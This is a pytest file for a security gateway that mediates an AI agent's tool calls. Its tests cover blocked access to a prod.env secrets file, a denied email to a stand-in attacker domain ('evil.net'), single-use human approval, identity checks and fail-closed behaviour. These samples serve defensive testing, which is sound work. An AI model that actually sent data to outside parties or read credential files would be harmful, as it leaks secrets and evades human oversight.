"""The agent-side client against the real FastAPI app (in-process)."""
import pytest

from agent_gateway.client import GatewayClient, GatewayError, GatewayTools, default_tool_specs

from conftest import REPORT
from test_api_auth import BASE, Env

USER = "user:shyam@enterprise.com"


@pytest.fixture
def env():
    return Env()


def make_client(env, **kw):
    return GatewayClient(BASE, "agent:repo-helper:v2.1:abc123", env.agent_key, lambda: env.actor(),
                         user_id=kw.pop("user_id", USER), task_id="task:doc-update-789", session_id="sess-4f8a2b",
                         http=env.client, clock=env.clock, **kw)


def tools(env, **kw):
    return GatewayTools(make_client(env, **kw), default_tool_specs())


def test_allowed_read_returns_ok_text(env):
    out = tools(env).call("read_file", {"path": REPORT})
    assert out.startswith("OK: ") and "EMEA" in out


def test_blocked_file_is_denied_with_guidance_not_an_exception(env):
    out = tools(env).call("read_file", {"path": "/app/reports/prod.env"})
    assert out.startswith("DENIED by security policy") and "NOT executed" in out and "blocked pattern" in out


def test_exfiltration_attempt_is_denied(env):
    out = tools(env).call("send_email", {"to": "bob@evil.net", "subject": "s", "body": "b"})
    assert out.startswith("DENIED") and "evil.net" in out


def test_pending_then_human_approves_then_runtime_resumes_exact_action(env):
    t = tools(env)
    out = t.call("open_pull_request", {"title": "Update docs", "head": "feature/x", "base": "main"})
    assert out.startswith("PENDING HUMAN APPROVAL")
    (aid,) = t.pending
    assert aid in out
    early = t.resume(aid)  # the runtime jumps the gun: nobody has approved yet
    assert not early.startswith("OK") and aid in t.pending  # refused, and the pending action is NOT forgotten
    env.client.post(f"/v1/approvals/{aid}/approve", headers=env.staff("user:manager@enterprise.com"))
    assert t.resume(aid).startswith("OK: ")
    assert aid not in t.pending
    assert t.resume(aid).startswith("ERROR")  # nothing left to resume: an approval is single-use


def test_resume_before_approval_is_denied_not_executed(env):
    t = tools(env)
    t.call("open_pull_request", {"title": "T", "head": "h", "base": "main"})
    (aid,) = t.pending
    out = t.resume(aid)
    assert out.startswith(("DENIED", "PENDING")) and not out.startswith("OK")


def test_actor_identity_mismatch_is_a_gateway_error_reported_as_text(env):
    out = tools(env, user_id="user:eve@enterprise.com").call("read_file", {"path": REPORT})
    # the actor token says shyam, the request claims eve: the gateway refuses to authenticate it
    assert out.startswith("ERROR: the security gateway could not process this") and "401" in out


def test_unknown_tool_and_bad_input_are_handled(env):
    t = tools(env)
    assert t.call("format_disk", {}).startswith("ERROR: unknown tool")
    assert t.call("read_file", {}).startswith("ERROR: bad input")


def test_unreachable_gateway_fails_closed(env):
    c = GatewayClient("http://127.0.0.1:9", "agent:x", env.agent_key, lambda: "t", user_id=USER, task_id="t",
                      session_id="s")
    with pytest.raises(GatewayError, match="unreachable"):
        c.execute("file_reader", "files:read", "file:/x", {})
    out = GatewayTools(c, default_tool_specs()).call("read_file", {"path": REPORT})
    assert out.startswith("ERROR") and "Nothing was executed" in out


def test_each_call_uses_a_new_step_so_nothing_is_flagged_as_replay(env):
    t = tools(env)
    assert all(t.call("read_file", {"path": REPORT}).startswith("OK") for _ in range(4))


def test_definitions_match_what_an_llm_api_expects(env):
    defs = tools(env).definitions()
    assert {d["name"] for d in defs} == {"read_file", "open_pull_request", "send_email"}
    assert all(set(d) == {"name", "description", "input_schema"} for d in defs)
